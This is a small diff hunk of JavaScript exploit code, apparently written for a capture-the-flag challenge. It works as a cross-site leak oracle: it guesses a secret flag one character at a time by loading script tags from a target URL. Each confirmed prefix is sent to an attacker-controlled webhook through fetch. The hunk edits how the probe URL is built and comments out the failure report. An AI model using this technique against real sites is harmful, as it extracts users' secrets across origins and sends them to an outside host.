@@ -20,13 +20,13 @@
         
     async function doGuess(g){
         const script = document.createElement("script");
-        script.src = url+g;
+        script.src = url+FLAG+g;
         script.onload = () => {
             FLAG += g;
             fetch(whook+FLAG);
             makeFetchRequest();
         };
-        script.onerror = () => {fetch(whook+g+'Fail')};
+        //script.onerror = () => {fetch(whook+g+'Fail')};
         document.head.appendChild(script);
     }
     makeFetchRequest();
